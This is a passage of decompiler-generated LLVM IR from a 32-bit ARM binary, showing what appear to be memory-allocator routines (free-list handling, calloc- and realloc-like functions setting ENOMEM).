dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a50, %dec_label_pc_13a0c, %dec_label_pc_139f4, %dec_label_pc_13954
  %v0_13a60 = call i32 @function_13470()
  store i32 %v0_13a60, i32* %r0.global-to-local, align 4
  %v2_13a68 = inttoptr i32 %v0_13a60 to i32*
  store i32 12, i32* %v2_13a68, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %dec_label_pc_13a50, %dec_label_pc_13a60
  %v0_13a70 = phi i32 [ %v4_13a54, %dec_label_pc_13a50 ], [ 0, %dec_label_pc_13a60 ]
  store i32 %v0_13a70, i32* %r0.global-to-local, align 4
  store i32 %v3_13940, i32* @r4, align 4
  store i32 %v6_13940, i32* @r5, align 4
  store i32 %v9_13940, i32* @r6, align 4
  ret i32 %v0_13a70

; uselistorder directives
  uselistorder i32 %v0_13a70, { 1, 0 }
  uselistorder i32 %v3_13a34, { 1, 0, 2 }
  uselistorder i32 %v1_139e4, { 1, 0, 2 }
  uselistorder i32 %v1_139d0, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_13980, { 1, 0, 2 }
  uselistorder i32 %v0_13944, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 3, 6, 8, 9, 10, 4, 12, 11, 19, 14, 13, 2, 15, 16, 17, 18, 0, 1 }
  uselistorder label %dec_label_pc_13a70, { 1, 0 }
  uselistorder label %dec_label_pc_13a50, { 1, 0 }
  uselistorder label %dec_label_pc_139f4, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1395c, { 1, 0 }
}

define i32 @function_13a94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a94:
  %stack_var_-12 = alloca i32, align 4
  %v3_13a94 = load i32, i32* @r4, align 4
  store i32 %v3_13a94, i32* %stack_var_-12, align 4
  %v6_13a94 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_13a9c = mul i32 %arg2, %arg1
  store i32 %v2_13a9c, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13aa0 = icmp eq i32 %arg1, 0
  store i32 %v2_13a9c, i32* @r0, align 4
  br i1 %v2_13aa0, label %dec_label_pc_13acc, label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a94
  %v0_13aac = call i32 @function_12ae8()
  %v0_13ab0 = load i32, i32* @r5, align 4
  %v9_13ab0 = icmp eq i32 %v0_13ab0, %v0_13aac
  store i32 0, i32* @r5, align 4
  br i1 %v9_13ab0, label %dec_label_pc_13aac.dec_label_pc_13acc_crit_edge, label %dec_label_pc_13abc

dec_label_pc_13aac.dec_label_pc_13acc_crit_edge:  ; preds = %dec_label_pc_13aac
  %v0_13acc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13aac
  %v0_13abc = call i32 @function_13470()
  %v2_13ac4 = inttoptr i32 %v0_13abc to i32*
  store i32 12, i32* %v2_13ac4, align 4
  br label %dec_label_pc_13ae4

dec_label_pc_13acc:                               ; preds = %dec_label_pc_13aac.dec_label_pc_13acc_crit_edge, %dec_label_pc_13a94
  %v0_13acc = phi i32 [ %v0_13acc.pre, %dec_label_pc_13aac.dec_label_pc_13acc_crit_edge ], [ %v2_13a9c, %dec_label_pc_13a94 ]
  %v1_13ad0 = call i32 @function_13940(i32 %v0_13acc)
  store i32 %v1_13ad0, i32* @r5, align 4
  store i32 80612, i32* @lr, align 4
  %v1_13ae0 = icmp ne i32 %v1_13ad0, 0
  call void @__pseudo_cond_branch(i1 %v1_13ae0, i32 ptrtoint (i32* @global_var_134d0.601 to i32))
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13abc, %dec_label_pc_13acc
  %v0_13ae4 = load i32, i32* @r5, align 4
  %v2_13ae8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13ae8, i32* @r4, align 4
  store i32 %v6_13a94, i32* @r5, align 4
  ret i32 %v0_13ae4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ae4, { 1, 0 }
}

define i32 @function_13aec() local_unnamed_addr {
dec_label_pc_13aec:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_13aec = load i32, i32* @r0, align 4
  %v2_13aec = icmp eq i32 %v0_13aec, 0
  %v3_13af0 = load i32, i32* @r4, align 4
  store i32 %v3_13af0, i32* %stack_var_-24, align 4
  %v6_13af0 = load i32, i32* @r5, align 4
  %v9_13af0 = load i32, i32* @r6, align 4
  %v15_13af0 = load i32, i32* @r8, align 4
  br i1 %v2_13aec, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_13aec
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_13aec
  %v1_13af8 = add i32 %v0_13aec, -4
  %v2_13af8 = inttoptr i32 %v1_13af8 to i32*
  %v3_13af8 = load i32, i32* %v2_13af8, align 4
  store i32 %v3_13af8, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1e250.594 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_13af8, i32* @r4, align 4
  %v1_13b10 = call i32 @function_144d4()
  %v0_13b14 = load i32, i32* @r4, align 4
  %v0_13b18 = load i32, i32* @r5, align 4
  %v4_13b20 = call i32 @function_13e48(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v0_13b14, i32 %v0_13b18)
  %v1_13b28 = inttoptr i32 %v4_13b20 to i32*
  %v2_13b28 = load i32, i32* %v1_13b28, align 4
  store i32 %v2_13b28, i32* %r6.global-to-local, align 4
  %v2_13b2c = load i32, i32* @global_var_1e450.597, align 4
  %v4_13b30 = mul i32 %v2_13b2c, 8
  %v6_13b30 = icmp ult i32 %v2_13b28, %v4_13b30
  store i32 %v4_13b20, i32* @r4, align 4
  br i1 %v6_13b30, label %dec_label_pc_13b70, label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %bb11
  %v1_13b44 = call i32 @function_144d4()
  %v1_13b4c = call i32 @function_14c88(i32 0)
  %v0_13b50 = load i32, i32* @r4, align 4
  %v1_13b50 = add i32 %v0_13b50, 12
  store i32 %v1_13b50, i32* @r5, align 4
  %v9_13b54 = icmp eq i32 %v1_13b50, %v1_13b4c
  br i1 %v9_13b54, label %dec_label_pc_13b78, label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b3c
  %v1_13b68 = call i32 @function_144d4()
  br label %dec_label_pc_13b70

dec_label_pc_13b70:                               ; preds = %bb11, %dec_label_pc_13b5c, %bb14
  %v2_13b70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13b70, i32* @r4, align 4
  store i32 %v6_13af0, i32* @r5, align 4
  store i32 %v9_13af0, i32* %r6.global-to-local, align 4
  store i32 %v15_13af0, i32* %r8.global-to-local, align 4
  %v0_13b74 = call i32 @function_144d4()
  %v0_13b78.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b3c, %dec_label_pc_13b70
  %v1_13b80 = phi i32 [ %v0_13b50, %dec_label_pc_13b3c ], [ %v0_13b78.pre, %dec_label_pc_13b70 ]
  %v1_13b78 = add i32 %v1_13b80, 4
  %v2_13b78 = inttoptr i32 %v1_13b78 to i32*
  %v3_13b78 = load i32, i32* %v2_13b78, align 4
  %v2_13b7c = icmp eq i32 %v3_13b78, 0
  br i1 %v2_13b7c, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_13b78
  %v2_13b80 = add i32 %v1_13b80, 8
  %v3_13b80 = inttoptr i32 %v2_13b80 to i32*
  %v4_13b80 = load i32, i32* %v3_13b80, align 4
  %v3_13b84 = add i32 %v3_13b78, 8
  %v4_13b84 = inttoptr i32 %v3_13b84 to i32*
  store i32 %v4_13b80, i32* %v4_13b84, align 4
  %v0_13b88.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13b78, %bb12
  %v0_13b88 = phi i32 [ %v1_13b80, %dec_label_pc_13b78 ], [ %v0_13b88.pre, %bb12 ]
  %v1_13b88 = add i32 %v0_13b88, 8
  %v2_13b88 = inttoptr i32 %v1_13b88 to i32*
  %v3_13b88 = load i32, i32* %v2_13b88, align 4
  %v1_13b8c = add i32 %v0_13b88, 4
  %v2_13b8c = inttoptr i32 %v1_13b8c to i32*
  %v3_13b8c = load i32, i32* %v2_13b8c, align 4
  %v2_13b90 = icmp eq i32 %v3_13b88, 0
  br i1 %v2_13b90, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_13b94 = add i32 %v3_13b88, 4
  %v4_13b94 = inttoptr i32 %v3_13b94 to i32*
  store i32 %v3_13b8c, i32* %v4_13b94, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_13b98 = load i32, i32* %r8.global-to-local, align 4
  %v3_13b98 = inttoptr i32 %v2_13b98 to i32*
  store i32 %v3_13b8c, i32* %v3_13b98, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_13ba8 = call i32 @function_144d4()
  %v0_13bac = load i32, i32* %r6.global-to-local, align 4
  %v1_13bac = load i32, i32* @r4, align 4
  %v0_13bb4 = load i32, i32* @r5, align 4
  %v2_13bac = sub i32 12, %v0_13bac
  %v1_13bb0 = add i32 %v2_13bac, %v1_13bac
  %v2_13bb4 = sub i32 %v1_13bb0, %v0_13bb4
  %v1_13bb8 = call i32 @function_14c88(i32 %v2_13bb4)
  br label %dec_label_pc_13b70

; uselistorder directives
  uselistorder i32 %v0_13b88, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_14c88, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_13b78, { 1, 0 }
  uselistorder label %dec_label_pc_13b70, { 2, 1, 0 }
}

define i32 @function_13bdc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13bdc:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13bdc = load i32, i32* @r4, align 4
  store i32 %v3_13bdc, i32* %stack_var_-24, align 4
  %v6_13bdc = load i32, i32* @r5, align 4
  %v9_13bdc = load i32, i32* @r6, align 4
  %v12_13bdc = load i32, i32* @r7, align 4
  %v15_13bdc = load i32, i32* @r8, align 4
  %v18_13bdc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_13be0 = icmp eq i32 %arg2, 0
  %v0_13be4 = load i32, i32* @r0, align 4
  store i32 %v0_13be4, i32* @r7, align 4
  br i1 %v2_13be0, label %dec_label_pc_13bec, label %dec_label_pc_13bf4

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13bdc
  %v0_13bec = call i32 @function_13aec()
  %v0_13bfc.pre = load i32, i32* @r4, align 4
  %v2_13c00.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_13bfc

dec_label_pc_13bf4:                               ; preds = %dec_label_pc_13bdc
  %v2_13bf4 = icmp eq i32 %v0_13be4, 0
  br i1 %v2_13bf4, label %dec_label_pc_13bfc, label %dec_label_pc_13c08

dec_label_pc_13bfc:                               ; preds = %dec_label_pc_13bf4, %dec_label_pc_13bec
  %v2_13c00 = phi i32 [ %v3_13bdc, %dec_label_pc_13bf4 ], [ %v2_13c00.pre, %dec_label_pc_13bec ]
  %v0_13bfc = phi i32 [ %arg2, %dec_label_pc_13bf4 ], [ %v0_13bfc.pre, %dec_label_pc_13bec ]
  store i32 %v2_13c00, i32* @r4, align 4
  store i32 %v6_13bdc, i32* @r5, align 4
  store i32 %v9_13bdc, i32* @r6, align 4
  store i32 %v12_13bdc, i32* @r7, align 4
  store i32 %v18_13bdc, i32* @lr, align 4
  %v1_13c04 = call i32 @function_13940(i32 %v0_13bfc)
  %v0_13c08.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13bf4, %dec_label_pc_13bfc
  %v0_13c20 = phi i32 [ %v0_13be4, %dec_label_pc_13bf4 ], [ %v1_13c04, %dec_label_pc_13bfc ]
  %v0_13c08 = phi i32 [ %arg2, %dec_label_pc_13bf4 ], [ %v0_13c08.pre, %dec_label_pc_13bfc ]
  %v1_13c08 = add i32 %v0_13c08, 7
  %v1_13c0c = and i32 %v1_13c08, -4
  store i32 %v1_13c0c, i32* @r5, align 4
  %v2_13c10 = icmp ugt i32 %v1_13c0c, 10
  %v1_13c14 = add i32 %v0_13c20, -4
  %v2_13c14 = inttoptr i32 %v1_13c14 to i32*
  %v3_13c14 = load i32, i32* %v2_13c14, align 4
  store i32 %v3_13c14, i32* @r6, align 4
  br i1 %v2_13c10, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_13c08
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_13c08, %bb
  %v0_13c9c = phi i32 [ %v1_13c0c, %dec_label_pc_13c08 ], [ 12, %bb ]
  store i32 %v1_13c14, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_13c9c, %v3_13c14
  br i1 %tmp, label %dec_label_pc_13c28, label %dec_label_pc_13c9c

dec_label_pc_13c28:                               ; preds = %bb14
  %v2_13c1c = sub i32 %v0_13c9c, %v3_13c14
  %v1_13c38 = call i32 @function_144d4()
  %v0_13c40 = load i32, i32* @r8, align 4
  %v1_13c40 = load i32, i32* @r6, align 4
  %v2_13c40 = add i32 %v1_13c40, %v0_13c40
  %v4_13c48 = call i32 @function_13d88(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v2_13c40, i32 %v2_13c1c)
  store i32 %v4_13c48, i32* @r4, align 4
  store i32 80992, i32* @lr, align 4
  %v1_13c5c = call i32 @function_144d4()
  %v0_13c60 = load i32, i32* @r4, align 4
  %v2_13c60 = icmp eq i32 %v0_13c60, 0
  br i1 %v2_13c60, label %dec_label_pc_13c70, label %.thread

.thread:                                          ; preds = %dec_label_pc_13c28
  %v1_13c64 = load i32, i32* @r6, align 4
  %v3_13c64 = add i32 %v1_13c64, %v0_13c60
  %v2_13c68 = load i32, i32* @r7, align 4
  %v3_13c68 = add i32 %v2_13c68, -4
  %v4_13c68 = inttoptr i32 %v3_13c68 to i32*
  store i32 %v3_13c64, i32* %v4_13c68, align 4
  br label %dec_label_pc_13cdc

dec_label_pc_13c70:                               ; preds = %dec_label_pc_13c28
  %v0_13c70 = load i32, i32* @r5, align 4
  %v1_13c70 = add i32 %v0_13c70, -4
  %v1_13c74 = call i32 @function_13940(i32 %v1_13c70)
  store i32 %v1_13c74, i32* @r0, align 4
  store i32 %v1_13c74, i32* @r4, align 4
  %v2_13c78 = icmp eq i32 %v1_13c74, 0
  br i1 %v2_13c78, label %dec_label_pc_13c94, label %dec_label_pc_13c80

dec_label_pc_13c80:                               ; preds = %dec_label_pc_13c70
  %v0_13c80 = load i32, i32* @r6, align 4
  %v1_13c80 = add i32 %v0_13c80, -4
  store i32 %v1_13c80, i32* @r2, align 4
  %v0_13c84 = load i32, i32* @r7, align 4
  store i32 %v0_13c84, i32* @r1, align 4
  %v3_13c88 = call i32 @function_134b0(i32 %v1_13c74, i32 %v0_13c84, i32 %v1_13c80)
  %v0_13c8c = load i32, i32* @r7, align 4
  store i32 %v0_13c8c, i32* @r0, align 4
  %v0_13c90 = call i32 @function_13aec()
  %v0_13c94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c70, %dec_label_pc_13c80
  %v0_13c94 = phi i32 [ 0, %dec_label_pc_13c70 ], [ %v0_13c94.pre, %dec_label_pc_13c80 ]
  store i32 %v0_13c94, i32* @r7, align 4
  br label %dec_label_pc_13cdc

dec_label_pc_13c9c:                               ; preds = %bb14
  %v1_13c9c = add i32 %v0_13c9c, 28
  %tmp15 = icmp ugt i32 %v1_13c9c, %v3_13c14
  br i1 %tmp15, label %dec_label_pc_13cdc, label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c9c
  %v1_13cb4 = call i32 @function_144d4()
  %v0_13cb8 = load i32, i32* @r8, align 4
  %v1_13cb8 = load i32, i32* @r5, align 4
  %v2_13cb8 = add i32 %v1_13cb8, %v0_13cb8
  %v1_13cbc = load i32, i32* @r6, align 4
  %v2_13cbc = sub i32 %v1_13cbc, %v1_13cb8
  %v4_13cc4 = call i32 @function_13e48(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v2_13cb8, i32 %v2_13cbc)
  store i32 81112, i32* @lr, align 4
  %v1_13cd4 = call i32 @function_144d4()
  %v0_13cd8 = load i32, i32* @r5, align 4
  %v1_13cd8 = load i32, i32* @r7, align 4
  %v2_13cd8 = add i32 %v1_13cd8, -4
  %v3_13cd8 = inttoptr i32 %v2_13cd8 to i32*
  store i32 %v0_13cd8, i32* %v3_13cd8, align 4
  br label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %.thread, %dec_label_pc_13c9c, %dec_label_pc_13c94, %dec_label_pc_13ca8
  %v0_13cdc = load i32, i32* @r7, align 4
  %v2_13ce0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13ce0, i32* @r4, align 4
  store i32 %v6_13bdc, i32* @r5, align 4
  store i32 %v9_13bdc, i32* @r6, align 4
  store i32 %v12_13bdc, i32* @r7, align 4
  store i32 %v15_13bdc, i32* @r8, align 4
  ret i32 %v0_13cdc

; uselistorder directives
  uselistorder i32 %v1_13cb8, { 1, 0 }
  uselistorder i32 %v0_13c9c, { 1, 2, 0 }
  uselistorder i32 %v3_13c14, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32** @global_var_1e250.594, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1e250.594 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32)* @function_13940, { 3, 55, 0, 8, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 4, 2, 1, 9, 7 }
  uselistorder i32 ()* @function_13aec, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32* @r8, { 90, 91, 92, 93, 94, 103, 9, 7, 10, 13, 8, 11, 12, 96, 95, 14, 15, 101, 102, 97, 98, 99, 100, 79, 80, 81, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 6, 50, 51, 52, 53, 54, 55, 56, 57, 5, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 82, 83, 84, 85, 86, 87, 88, 89, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 145, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 170, 171, 169, 172, 173, 174, 175, 176, 177, 178 }
  uselistorder i32* @r7, { 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 45, 39, 40, 1, 54, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 55, 56, 217, 218, 219, 227, 228, 220, 221, 222, 223, 224, 225, 226, 178, 179, 180, 57, 0, 58, 59, 60, 61, 62, 63, 64, 65, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 75, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 3, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder label %dec_label_pc_13cdc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13c94, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_13c08, { 1, 0 }
}

define i32 @function_13cf4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13cf4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_13cf4 = inttoptr i32 %arg2 to i32*
  %v2_13cf4 = load i32, i32* %v1_13cf4, align 4
  %v3_13cf8 = load i32, i32* @r4, align 4
  store i32 %v3_13cf8, i32* %stack_var_-8, align 4
  %v1_13cfc = add i32 %v2_13cf4, 3
  %v1_13d00 = and i32 %v1_13cfc, -4
  store i32 %v1_13d00, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_13d08 = icmp ugt i32 %v1_13d00, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_13d10 = load i32, i32* %arg1, align 4
  store i32 %v2_13d10, i32* %r0.global-to-local, align 4
  br i1 %v2_13d08, label %dec_label_pc_13d7c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_13cf4
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d7c.preheader

dec_label_pc_13d7c.preheader:                     ; preds = %dec_label_pc_13cf4, %bb
  %v1_13d30 = phi i32 [ %v1_13d00, %dec_label_pc_13cf4 ], [ 12, %bb ]
  %v2_13d7c9 = icmp eq i32 %v2_13d10, 0
  br i1 %v2_13d7c9, label %dec_label_pc_13d84, label %dec_label_pc_13d1c

dec_label_pc_13d1c:                               ; preds = %dec_label_pc_13d7c.preheader, %dec_label_pc_13d78
  %v2_13d34 = phi i32 [ %v3_13d78, %dec_label_pc_13d78 ], [ %v2_13d10, %dec_label_pc_13d7c.preheader ]
  %v1_13d1c = inttoptr i32 %v2_13d34 to i32*
  %v2_13d1c = load i32, i32* %v1_13d1c, align 4
  store i32 %v2_13d1c, i32* %ip.global-to-local, align 4
  %v3_13d20 = icmp ult i32 %v2_13d1c, %v1_13d30
  br i1 %v3_13d20, label %dec_label_pc_13d78, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d1c
  %v1_13d28 = add i32 %v1_13d30, 44
  %v3_13d2c = icmp ult i32 %v2_13d1c, %v1_13d28
  br i1 %v3_13d2c, label %dec_label_pc_13d3c, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_13d28
  %v2_13d20.le = sub i32 %v2_13d1c, %v1_13d30
  store i32 %v2_13d20.le, i32* %v1_13d1c, align 4
  %v0_13d68.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_13d70.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d28
  %v1_13d3c = add i32 %v2_13d34, 4
  %v2_13d3c = inttoptr i32 %v1_13d3c to i32*
  %v3_13d3c = load i32, i32* %v2_13d3c, align 4
  store i32 %v3_13d3c, i32* %r2.global-to-local, align 4
  %v2_13d40 = icmp eq i32 %v3_13d3c, 0
  br i1 %v2_13d40, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_13d3c
  %v2_13d44 = add i32 %v2_13d34, 8
  %v3_13d44 = inttoptr i32 %v2_13d44 to i32*
  %v4_13d44 = load i32, i32* %v3_13d44, align 4
  %v3_13d48 = add i32 %v3_13d3c, 8
  %v4_13d48 = inttoptr i32 %v3_13d48 to i32*
  store i32 %v4_13d44, i32* %v4_13d48, align 4
  %v0_13d4c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13d3c, %bb27
  %v0_13d4c = phi i32 [ %v2_13d34, %dec_label_pc_13d3c ], [ %v0_13d4c.pre, %bb27 ]
  %v1_13d4c = add i32 %v0_13d4c, 8
  %v2_13d4c = inttoptr i32 %v1_13d4c to i32*
  %v3_13d4c = load i32, i32* %v2_13d4c, align 4
  %v1_13d50 = add i32 %v0_13d4c, 4
  %v2_13d50 = inttoptr i32 %v1_13d50 to i32*
  %v3_13d50 = load i32, i32* %v2_13d50, align 4
  %v2_13d54 = icmp eq i32 %v3_13d4c, 0
  br i1 %v2_13d54, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_13d58 = add i32 %v3_13d4c, 4
  %v4_13d58 = inttoptr i32 %v3_13d58 to i32*
  store i32 %v3_13d50, i32* %v4_13d58, align 4
  %v1_13d60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_13d60, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_13d5c = load i32, i32* %r1.global-to-local, align 4
  %v3_13d5c = inttoptr i32 %v2_13d5c to i32*
  store i32 %v3_13d50, i32* %v3_13d5c, align 4
  %v1_13d64.pre = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_13d64.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_13d70 = phi i32 [ %v0_13d70.pre, %.thread._crit_edge ], [ %v1_13d60, %bb28 ], [ %v1_13d64.pre, %.thread5 ]
  %v0_13d68 = phi i32 [ %v0_13d68.pre, %.thread._crit_edge ], [ %v1_13d60, %bb28 ], [ %v1_13d64.pre, %.thread5 ]
  %v1_13d68 = load i32, i32* %r0.global-to-local, align 4
  %v2_13d68 = sub i32 %v1_13d68, %v0_13d68
  %v1_13d6c = add i32 %v2_13d68, 12
  store i32 %v1_13d6c, i32* %r0.global-to-local, align 4
  %v1_13d70 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d70 = inttoptr i32 %v1_13d70 to i32*
  store i32 %v0_13d70, i32* %v2_13d70, align 4
  %v2_13d74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d74, i32* %r4.global-to-local, align 4
  ret i32 %v1_13d6c

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d1c
  %v1_13d78 = add i32 %v2_13d34, 4
  %v2_13d78 = inttoptr i32 %v1_13d78 to i32*
  %v3_13d78 = load i32, i32* %v2_13d78, align 4
  store i32 %v3_13d78, i32* %r0.global-to-local, align 4
  %v2_13d7c = icmp eq i32 %v3_13d78, 0
  br i1 %v2_13d7c, label %dec_label_pc_13d7c.dec_label_pc_13d84_crit_edge, label %dec_label_pc_13d1c

dec_label_pc_13d7c.dec_label_pc_13d84_crit_edge:  ; preds = %dec_label_pc_13d78
  br label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d7c.dec_label_pc_13d84_crit_edge, %dec_label_pc_13d7c.preheader
  store i32 %v3_13cf8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13d78, { 1, 2, 0 }
  uselistorder i32 %v0_13d4c, { 1, 0 }
  uselistorder i32 %v2_13d1c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13d34, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_13d30, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13d1c, { 1, 0 }
  uselistorder label %dec_label_pc_13d7c.preheader, { 1, 0 }
}

define i32 @function_13d88(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13d88:
  %ip.global-to-local = alloca i32, align 4
